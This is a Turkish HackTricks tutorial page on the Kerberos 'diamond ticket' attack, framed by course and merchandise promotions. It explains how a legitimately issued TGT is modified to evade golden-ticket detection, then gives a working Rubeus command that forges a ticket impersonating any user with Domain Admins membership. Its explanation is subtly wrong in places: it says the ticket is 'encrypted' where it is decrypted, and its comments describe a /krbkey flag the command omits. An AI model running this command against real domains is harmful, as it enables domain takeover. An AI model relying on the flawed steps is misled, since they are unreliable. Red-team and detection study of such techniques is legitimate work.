# Elmas Bilet

<details>

<summary><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong> ile sıfırdan kahraman olmak için AWS hackleme öğrenin<strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamını görmek** veya HackTricks'i **PDF olarak indirmek** için [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimizden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi paylaşarak** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR gönderin**.

</details>

## Elmas Bilet

**Bir altın bileti gibi**, elmas bir bilettir ve herhangi bir kullanıcı olarak herhangi bir hizmete erişmek için kullanılabilir. Altın bir bilet tamamen çevrimdışı olarak sahte bir şekilde oluşturulur, o alanın krbtgt karma değeriyle şifrelenir ve ardından kullanım için bir oturum açma oturumuna geçirilir. Alan denetleyicileri, yasal olarak verdiği TGT'leri izlemediği için, kendi krbtgt karma değeriyle şifrelenmiş TGT'leri memnuniyetle kabul eder.

Altın biletlerin kullanımını tespit etmek için iki yaygın teknik vardır:

* Karşılık gelen bir AS-REQ olmayan TGS-REQ'leri arayın.
* Mimikatz'ın varsayılan 10 yıllık ömrü gibi saçma değerlere sahip TGT'leri arayın.

Bir **elmas bilet**, bir DC tarafından verilen yasal bir TGT'nin alanlarını değiştirerek oluşturulur. Bunun için bir TGT talep edilir, alanın krbtgt karma değeriyle şifrelenir, biletin istenen alanları değiştirilir ve ardından tekrar şifrelenir. Bu, bir altın bileti'nin yukarıda bahsedilen iki kusurunu aşar çünkü:

* TGS-REQ'lerin bir önceki AS-REQ'i olacaktır.
* TGT, bir DC tarafından verildiği için, alanın Kerberos politikasından tüm doğru ayrıntılara sahip olacaktır. Bir altın bilete doğru şekilde sahte yapılabilir, ancak daha karmaşık ve hatalara açıktır.
```bash
# Get user RID
powershell Get-DomainUser -Identity <username> -Properties objectsid

.\Rubeus.exe diamond /tgtdeleg /ticketuser:<username> /ticketuserid:<RID of username> /groups:512

# /tgtdeleg uses the Kerberos GSS-API to obtain a useable TGT for the user without needing to know their password, NTLM/AES hash, or elevation on the host.
# /ticketuser is the username of the principal to impersonate.
# /ticketuserid is the domain RID of that principal.
# /groups are the desired group RIDs (512 being Domain Admins).
# /krbkey is the krbtgt AES256 hash.
```
<details>

<summary><strong>AWS hackleme becerilerini sıfırdan kahraman seviyesine öğrenmek için</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>'ı öğrenin!</strong></summary>

HackTricks'ı desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek paylaşın**.

</details>
